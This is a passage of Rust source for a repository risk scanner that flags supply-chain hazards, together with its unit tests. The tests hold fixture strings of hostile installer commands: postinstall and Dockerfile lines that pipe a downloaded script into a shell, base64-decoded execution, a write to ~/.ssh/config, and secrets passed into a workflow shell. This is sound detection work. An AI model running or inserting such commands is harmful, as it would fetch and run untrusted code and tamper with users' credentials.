            || p.ends_with("/yarn.lock")
            || p.ends_with("/bun.lockb")
    });
    let has_cargo_toml = paths
        .iter()
        .any(|p| p.ends_with("/cargo.toml") || p == "cargo.toml");
    let has_cargo_lock = paths
        .iter()
        .any(|p| p.ends_with("/cargo.lock") || p == "cargo.lock");
    let has_pyproject = paths
        .iter()
        .any(|p| p.ends_with("/pyproject.toml") || p == "pyproject.toml");
    let has_requirements = paths
        .iter()
        .any(|p| p.ends_with("/requirements.txt") || p == "requirements.txt");
    let has_python_lock = paths.iter().any(|p| {
        matches!(p.as_str(), "poetry.lock" | "uv.lock" | "pdm.lock")
            || p.ends_with("/poetry.lock")
            || p.ends_with("/uv.lock")
            || p.ends_with("/pdm.lock")
    });

    if has_package_json && !has_npm_lock {
        let path = first_matching_path(&paths, "package.json").unwrap_or("package.json");
        push_unique(
            out,
            seen,
            manifest_finding(
                path,
                "manifest-missing-lockfile",
                "Package manifest has no lockfile for reproducible dependency resolution",
                "npm package.json without package-lock/pnpm-lock/yarn.lock/bun.lockb",
            ),
        );
    }
    if has_cargo_toml && !has_cargo_lock {
        let path = first_matching_path(&paths, "Cargo.toml").unwrap_or("Cargo.toml");
        push_unique(
            out,
            seen,
            manifest_finding(
                path,
                "manifest-missing-lockfile",
                "Package manifest has no lockfile for reproducible dependency resolution",
                "Cargo.toml without Cargo.lock",
            ),
        );
    }
    if (has_pyproject || has_requirements) && !has_python_lock {
        let path = first_matching_path(&paths, "pyproject.toml")
            .or_else(|| first_matching_path(&paths, "requirements.txt"))
            .unwrap_or("pyproject.toml");
        push_unique(
            out,
            seen,
            manifest_finding(
                path,
                "manifest-missing-lockfile",
                "Package manifest has no lockfile for reproducible dependency resolution",
                "Python manifest without poetry.lock/uv.lock/pdm.lock",
            ),
        );
    }

    for row in rows {
        if !is_manifest_or_lockfile_path(&row.path) {
            continue;
        }
        for loc in &row.locations {
            let lower = loc.text.to_ascii_lowercase();
            if looks_like_git_dependency_source(&row.path, &loc.text) {
                push_unique(
                    out,
                    seen,
                    RiskFinding {
                        severity: Severity::Medium,
                        path: row.path.clone(),
                        line: Some(loc.line),
                        rule: "dependency-git-source".to_string(),
                        title: "Dependency source is a git reference that may not be immutable"
                            .to_string(),
                        evidence: sanitize_evidence(&loc.text),
                    },
                );
            }
            if looks_like_external_dependency_url(&row.path, &loc.text) {
                push_unique(
                    out,
                    seen,
                    RiskFinding {
                        severity: Severity::Medium,
                        path: row.path.clone(),
                        line: Some(loc.line),
                        rule: "dependency-http-source".to_string(),
                        title: "Dependency source is fetched from an explicit URL".to_string(),
                        evidence: sanitize_evidence(&loc.text),
                    },
                );
            }
            if lower.contains("path =") || lower.contains("\"file:") || lower.contains(" path ") {
                push_unique(
                    out,
                    seen,
                    RiskFinding {
                        severity: Severity::Low,
                        path: row.path.clone(),
                        line: Some(loc.line),
                        rule: "dependency-path-source".to_string(),
                        title: "Dependency source uses a local path reference".to_string(),
                        evidence: sanitize_evidence(&loc.text),
                    },
                );
            }
        }
    }
}

fn push_container_global_risks(
    out: &mut Vec<RiskFinding>,
    seen: &mut BTreeSet<String>,
    rows: &[AstRow],
) {
    for row in rows {
        if !is_dockerfile_path(&row.path) {
            continue;
        }
        let from_scratch = row.locations.iter().any(|loc| {
            loc.text
                .trim_start()
                .to_ascii_lowercase()
                .starts_with("from scratch")
        });
        let has_user = row.locations.iter().any(|loc| {
            loc.text
                .trim_start()
                .to_ascii_lowercase()
                .starts_with("user ")
        });
        if !has_user && !from_scratch {
            push_unique(
                out,
                seen,
                RiskFinding {
                    severity: Severity::Medium,
                    path: row.path.clone(),
                    line: None,
                    rule: "docker-default-root".to_string(),
                    title: "Dockerfile has no USER directive, so runtime defaults to root"
                        .to_string(),
                    evidence: "no USER directive".to_string(),
                },
            );
        }
    }
}

fn manifest_finding(path: &str, rule: &str, title: &str, evidence: &str) -> RiskFinding {
    RiskFinding {
        severity: Severity::Medium,
        path: path.to_string(),
        line: None,
        rule: rule.to_string(),
        title: title.to_string(),
        evidence: evidence.to_string(),
    }
}

fn first_matching_path<'a>(paths: &'a BTreeSet<String>, name: &str) -> Option<&'a str> {
    let lower_name = name.to_ascii_lowercase();
    paths
        .iter()
        .find(|path| {
            let lower = path.to_ascii_lowercase();
            lower == lower_name || lower.ends_with(&format!("/{lower_name}"))
        })
        .map(String::as_str)
}

fn is_manifest_or_lockfile_path(path: &str) -> bool {
    let path = normalized_path(path).to_ascii_lowercase();
    let name = path.rsplit('/').next().unwrap_or(path.as_str());
    matches!(
        name,
        "package.json"
            | "package-lock.json"
            | "pnpm-lock.yaml"
            | "yarn.lock"
            | "bun.lockb"
            | "cargo.toml"
            | "cargo.lock"
            | "pyproject.toml"
            | "requirements.txt"
            | "poetry.lock"
            | "uv.lock"
            | "pdm.lock"
    )
}

fn looks_like_git_dependency_source(path: &str, text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    if is_known_registry_dependency_source(path, &lower) {
        return false;
    }
    lower.contains("git+")
        || lower.contains("git =")
        || lower.contains("git=")
        || lower.contains("git:")
        || lower.contains("github.com/")
}

fn looks_like_external_dependency_url(path: &str, text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    (lower.contains("http://") || lower.contains("https://"))
        && !is_known_registry_dependency_source(path, &lower)
}

fn is_known_registry_dependency_source(path: &str, lower_text: &str) -> bool {
    lower_text.contains("registry.npmjs.org")
        || lower_text.contains("crates.io")
        || lower_text.contains("pypi.org")
        || (normalized_path(path)
            .to_ascii_lowercase()
            .ends_with("cargo.lock")
            && lower_text.contains("registry+https://github.com/rust-lang/crates.io-index"))
}

fn sanitize_evidence(text: &str) -> String {
    let mut evidence: String = text.chars().take(160).collect();
    for token in
        text.split(|c: char| !(c.is_ascii_alphanumeric() || c == '_' || c == '-' || c == '.'))
    {
        if token.to_ascii_lowercase().starts_with("secrets.") {
            evidence = evidence.replace(token, "secrets.<redacted>");
        }
    }
    evidence
}

fn push_unique(out: &mut Vec<RiskFinding>, seen: &mut BTreeSet<String>, mut finding: RiskFinding) {
    // Keep severity proportionate to where the evidence lives before deduping.
    finding.severity = PathScope::classify(&finding.path).cap(finding.severity);
    let key = format!(
        "{}\0{:?}\0{}\0{}",
        finding.path, finding.line, finding.rule, finding.evidence
    );
    if seen.insert(key) {
        out.push(finding);
    }
}

fn is_external_text(text: &str) -> bool {
    // Intra-crate Rust refs (`crate::`, `super::`) stay inside the crate and are
    // not black boxes in a whole-project audit. Only relative cross-package
    // imports remain genuinely unfollowed.
    text.trim_start().starts_with("from .")
}

fn severity_rank(s: Severity) -> u8 {
    match s {
        Severity::High => 0,
        Severity::Medium => 1,
        Severity::Low => 2,
    }
}

fn escape_cell(s: &str) -> String {
    s.replace('|', "\\|").replace('\n', " ")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn finds_panic_edges_with_lines() {
        let seed =
            r#"{"path":"src/a.rs","locations":[{"kind":"call","line":9,"text":"thing.unwrap"}]}"#;
        let findings = findings_from_seed(seed);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].line, Some(9));
        assert_eq!(findings[0].rule, "panic-edge");
    }

    #[test]
    fn ignores_fallback_unwrap_variants() {
        let seed = r#"{"path":"src/a.rs","locations":[{"kind":"call","line":9,"text":"thing.unwrap_or"}]}"#;
        assert!(findings_from_seed(seed).is_empty());
    }

    #[test]
    fn renders_empty_report() {
        let md = render_markdown_with_language(&[], ReportLanguage::En);
        assert!(md.contains("No deterministic risks found"));
    }

    #[test]
    fn agent_gate_accepts_empty_clean_input() {
        let report = agent_gate_from_seed("", AgentGateCoverage::default());
        assert!(report.safe_to_agent_run);
        assert!(report.markdown.contains("VERDICT: ACCEPT"));
        assert!(report.markdown.contains("SAFE_TO_AGENT_RUN: yes"));
    }

    #[test]
    fn agent_gate_rejects_high_deterministic_findings() {
        let seed =
            r#"{"path":"src/a.rs","locations":[{"kind":"call","line":9,"text":"thing.unwrap"}]}"#;
        let report = agent_gate_from_seed(
            seed,
            AgentGateCoverage {
                candidate_files: 1,
                dehydrated_files: 1,
                ..Default::default()
            },
        );

        assert!(!report.safe_to_agent_run);
        assert!(report.markdown.contains("VERDICT: REJECT"));
        assert!(report.markdown.contains("SAFE_TO_AGENT_RUN: no"));
        assert!(report.markdown.contains("src/a.rs:9 [panic-edge]"));
    }

    #[test]
    fn agent_gate_marks_incomplete_coverage() {
        let report = agent_gate_from_seed(
            "",
            AgentGateCoverage {
                candidate_files: 3,
                read_failed: 1,
                ..Default::default()
            },
        );

        assert!(!report.safe_to_agent_run);
        assert!(report.markdown.contains("VERDICT: INCOMPLETE"));
        assert!(
            report
                .markdown
                .contains("coverage requires review: read_failed=1")
        );
    }

    #[test]
    fn agent_gate_keeps_compressed_records_complete() {
        let report = agent_gate_from_seed(
            "",
            AgentGateCoverage {
                candidate_files: 1,
                dehydrated_files: 1,
                record_truncated: 1,
                seed_bytes: 128,
                truncated_records: vec![TruncatedRecord {
                    path: "Cargo.lock".to_string(),
                    original_bytes: 100_000,
                    compacted_bytes: 4096,
                    reason: "compact_record_limits".to_string(),
                }],
                ..Default::default()
            },
        );

        assert!(report.safe_to_agent_run);
        assert!(report.markdown.contains("VERDICT: ACCEPT"));
        assert!(report.markdown.contains("TRUNCATED_RECORDS:"));
        assert!(
            !report
                .markdown
                .contains("coverage requires review: record_truncated=1")
        );
        let json: serde_json::Value = serde_json::from_str(&report.json).unwrap_or_default();
        assert_eq!(json["verdict"], "ACCEPT");
        assert_eq!(json["coverage"]["record_truncated"], 1);
    }

    #[test]
    fn flags_npm_lifecycle_download_execute() {
        let seed = r#"{"path":"package.json","locations":[{"kind":"call","line":4,"text":"\"postinstall\": \"curl https://example.invalid/install.sh | sh\""}]}"#;
        let findings = findings_from_seed(seed);

        assert!(findings.iter().any(|f| {
            f.rule == "npm-lifecycle-script" && f.severity == Severity::High && f.line == Some(4)
        }));
        assert!(
            findings
                .iter()
                .any(|f| f.rule == "download-execute" && f.severity == Severity::High)
        );
    }

    #[test]
    fn flags_rust_build_script_command() {
        let seed = r#"{"path":"build.rs","locations":[{"kind":"call","line":7,"text":"std::process::Command::new"}]}"#;
        let findings = findings_from_seed(seed);

        assert!(findings.iter().any(|f| {
            f.rule == "rust-build-script-command"
                && f.severity == Severity::High
                && f.line == Some(7)
        }));
    }

    #[test]
    fn flags_python_setup_command() {
        let seed = r#"{"path":"setup.py","locations":[{"kind":"call","line":5,"text":"subprocess.check_call"}]}"#;
        let findings = findings_from_seed(seed);

        assert!(findings.iter().any(|f| {
            f.rule == "python-setup-command" && f.severity == Severity::High && f.line == Some(5)
        }));
    }

    #[test]
    fn flags_dockerfile_download_execute() {
        let seed = r#"{"path":"Dockerfile","locations":[{"kind":"call","line":3,"text":"RUN curl https://example.invalid/install.sh | bash"}]}"#;
        let findings = findings_from_seed(seed);

        assert!(findings.iter().any(|f| {
            f.rule == "download-execute" && f.severity == Severity::High && f.line == Some(3)
        }));
    }

    #[test]
    fn flags_workflow_secret_shell_and_redacts_secret_name() {
        let seed = r#"{"path":".github/workflows/release.yml","locations":[{"kind":"signature","line":10,"text":"run: bash -c \"deploy ${{ secrets.RELEASE_TOKEN }}\""}]}"#;
        let findings = findings_from_seed(seed);

        assert!(findings.iter().any(|f| {
            f.rule == "workflow-secret-shell"
                && f.severity == Severity::Medium
                && f.evidence.contains("secrets.<redacted>")
        }));
        assert!(
            !findings
                .iter()
                .any(|f| f.evidence.contains("RELEASE_TOKEN"))
        );
    }

    #[test]
    fn workflow_secret_shell_does_not_flag_bare_run_lines() {
        let seed = r#"{"path":".github/workflows/release.yml","locations":[{"kind":"signature","line":10,"text":"run: |"},{"kind":"signature","line":11,"text":"TOKEN: ${{ secrets.RELEASE_TOKEN }}"}]}"#;
        let findings = findings_from_seed(seed);

        assert!(
            !findings
                .iter()
                .any(|f| f.rule == "workflow-secret-shell" && f.line == Some(10)),
            "bare run line should not inherit file-scope secret risk: {findings:?}"
        );
    }

    #[test]
    fn flags_unpinned_github_actions() {
        let seed = r#"{"path":".github/workflows/ci.yml","locations":[{"kind":"signature","line":7,"text":"uses: actions/checkout@v4"},{"kind":"signature","line":8,"text":"uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a"}]}"#;
        let findings = findings_from_seed(seed);

        assert_eq!(
            findings
                .iter()
                .filter(|f| f.rule == "unpinned-github-action")
                .count(),
            1
        );
    }

    #[test]
    fn flags_broad_but_not_scoped_workflow_write_permissions() {
        let broad = r#"{"path":".github/workflows/release.yml","locations":[{"kind":"signature","line":3,"text":"permissions: write-all"}]}"#;
        let scoped = r#"{"path":".github/workflows/release.yml","locations":[{"kind":"signature","line":9,"text":"  contents: write"}]}"#;

        let broad_findings = findings_from_seed(broad);
        assert!(broad_findings.iter().any(|f| {
            f.rule == "workflow-write-all" && f.severity == Severity::High && f.line == Some(3)
        }));

        let scoped_findings = findings_from_seed(scoped);
        assert!(
            !scoped_findings
                .iter()
                .any(|f| f.rule == "workflow-write-all")
        );
        assert!(scoped_findings.is_empty());
    }

    #[test]
    fn ignores_cargo_lock_crates_io_registry_source() {
        let seed = r#"{"path":"Cargo.lock","locations":[{"kind":"signature","line":8,"text":"source = \"registry+https://github.com/rust-lang/crates.io-index\""}]}"#;
        let findings = findings_from_seed(seed);

        assert!(
            !findings
                .iter()
                .any(|f| f.rule == "dependency-git-source" || f.rule == "dependency-http-source"),
            "Cargo registry metadata should not be dependency-source risk: {findings:?}"
        );
    }

    #[test]
    fn still_flags_real_git_dependency_sources() {
        let seed = r#"{"path":"Cargo.toml","locations":[{"kind":"signature","line":7,"text":"helper = { git = \"https://github.com/example/helper.git\", branch = \"main\" }"}]}"#;
        let findings = findings_from_seed(seed);

        assert!(
            findings
                .iter()
                .any(|f| { f.rule == "dependency-git-source" && f.severity == Severity::Medium })
        );
    }

    #[test]
    fn flags_base64_decode_execution() {
        let seed = r#"{"path":"install.sh","locations":[{"kind":"call","line":2,"text":"echo d2hvYW1p | base64 -d | sh"}]}"#;
        let findings = findings_from_seed(seed);

        assert!(findings.iter().any(|f| {
            f.rule == "base64-execute" && f.severity == Severity::High && f.line == Some(2)
        }));
    }

    #[test]
    fn flags_install_home_write() {
        let seed = r#"{"path":"install.sh","locations":[{"kind":"call","line":3,"text":"echo Host example.invalid >> ~/.ssh/config"}]}"#;
        let findings = findings_from_seed(seed);

        assert!(findings.iter().any(|f| {
            f.rule == "install-home-write" && f.severity == Severity::High && f.line == Some(3)
        }));
    }

    #[test]
    fn findings_json_round_trips_to_markdown() {
        let seed = r#"{"path":"src/a.rs","external":["[EXTERNAL_BLACKBOX] use crate::x;"]}"#;
        let json = findings_json_from_seed(seed);
        let md = markdown_from_findings_json_with_language(&json, ReportLanguage::En)
            .unwrap_or_default();
        assert!(md.contains("external-blackbox"));
    }

    #[test]
    fn renders_localized_markdown() {
        let seed =
            r#"{"path":"src/a.rs","locations":[{"kind":"call","line":2,"text":"x.unwrap"}]}"#;
        let md = markdown_from_seed_with_language(seed, ReportLanguage::Zh);
        assert!(md.contains("\u{98ce}\u{9669}\u{8d26}\u{672c}"));
        assert!(md.contains("\u{4e25}\u{91cd}\u{6027}"));
    }

    #[test]
    fn path_scope_classifies_common_layouts() {
        assert_eq!(PathScope::classify("src/report.rs"), PathScope::Production);
        assert_eq!(PathScope::classify("build.rs"), PathScope::Production);
        assert_eq!(
            PathScope::classify(".github/workflows/release.yml"),
            PathScope::Ci
        );
        assert_eq!(
            PathScope::classify("tests/repo_intake_fixtures.rs"),
            PathScope::Test
        );
        assert_eq!(
            PathScope::classify("tests/fixtures/repo-intake/base64-shell/install.sh"),
            PathScope::TestFixture
        );
        assert_eq!(
            PathScope::classify("fixtures/repo-intake/base64-shell/install.sh"),
            PathScope::TestFixture
        );
        assert_eq!(PathScope::classify("README.md"), PathScope::Docs);
        // A fixture that ships its own workflow stays a fixture, not real CI.
        assert_eq!(
            PathScope::classify(
                "tests/fixtures/repo-intake/github-action-secret-shell/.github/workflows/release.yml"
            ),
            PathScope::TestFixture
        );
    }

    #[test]
    fn production_panic_edge_stays_high() {
        let seed =
            r#"{"path":"src/a.rs","locations":[{"kind":"call","line":9,"text":"thing.unwrap"}]}"#;
        let findings = findings_from_seed(seed);
        assert!(
            findings
                .iter()
                .any(|f| f.rule == "panic-edge" && f.severity == Severity::High)
        );
    }

    #[test]
    fn panic_edge_in_tests_is_capped_to_low() {
        let seed = r#"{"path":"tests/benchmark_mode.rs","locations":[{"kind":"call","line":9,"text":"thing.unwrap"}]}"#;
        let findings = findings_from_seed(seed);
        assert!(
            findings
                .iter()
                .any(|f| f.rule == "panic-edge" && f.severity == Severity::Low)
        );
        assert!(
            !findings
                .iter()
                .any(|f| f.rule == "panic-edge" && f.severity == Severity::High)
        );
    }

    #[test]
    fn fixture_supply_chain_is_capped_to_low() {
        let seed = r#"{"path":"tests/fixtures/repo-intake/npm-postinstall-download/package.json","locations":[{"kind":"call","line":4,"text":"\"postinstall\": \"curl https://example.invalid/install.sh | sh\""}]}"#;
        let findings = findings_from_seed(seed);
        assert!(
            findings.iter().any(|f| f.rule == "download-execute"),
            "fixture sample still surfaces the rule"
        );
        assert!(
            findings.iter().all(|f| f.severity == Severity::Low),
            "fixture findings must not stay High: {findings:?}"
        );
    }

    #[test]
    fn production_supply_chain_stays_high() {
        let seed = r#"{"path":"package.json","locations":[{"kind":"call","line":4,"text":"\"postinstall\": \"curl https://example.invalid/install.sh | sh\""}]}"#;
        let findings = findings_from_seed(seed);
        assert!(
            findings
                .iter()
                .any(|f| f.rule == "download-execute" && f.severity == Severity::High)
        );
    }

    #[test]
    fn docs_supply_chain_stays_high() {
        // A README that instructs `curl | bash` is a real instruction a human or
        // agent might follow, so it keeps full severity (agent-gate REJECT).
        let seed = r#"{"path":"README.md","locations":[{"kind":"call","line":6,"text":"curl https://example.invalid/install.sh | bash"}]}"#;
        let findings = findings_from_seed(seed);
        assert!(
            findings
                .iter()
                .any(|f| f.rule == "download-execute" && f.severity == Severity::High)
        );
    }

    #[test]
    fn intra_crate_rust_import_is_not_external() {
        let seed = r#"{"path":"src/react.rs","locations":[{"kind":"import","line":1,"text":"use crate::config::ReportLanguage;"}]}"#;
        let findings = findings_from_seed(seed);
        assert!(
            !findings.iter().any(|f| f.rule == "external-blackbox"),
            "intra-crate imports must not be flagged: {findings:?}"
        );
    }

    #[test]
    fn markdown_table_includes_scope_column() {
        let seed =
            r#"{"path":"src/a.rs","locations":[{"kind":"call","line":2,"text":"x.unwrap"}]}"#;
        let md = markdown_from_seed_with_language(seed, ReportLanguage::En);
        assert!(md.contains("| Severity | Scope | Location | Rule | Finding |"));
        assert!(md.contains("production"));
    }

    #[test]
    fn table_only_render_omits_h1_heading() {
        let seed =
            r#"{"path":"src/a.rs","locations":[{"kind":"call","line":2,"text":"x.unwrap"}]}"#;
        let table = markdown_table_from_seed_with_language(seed, ReportLanguage::En);
        assert!(!table.contains("# Risk Ledger"));
        assert!(table.contains("| Severity | Scope | Location | Rule | Finding |"));
        assert!(table.contains("panic-edge"));
    }

    #[test]
    fn table_only_render_reports_empty_state() {
        let table = markdown_table_from_seed_with_language("", ReportLanguage::En);
        assert!(table.contains("No deterministic risks found"));
        assert!(!table.contains("# Risk Ledger"));
    }
}
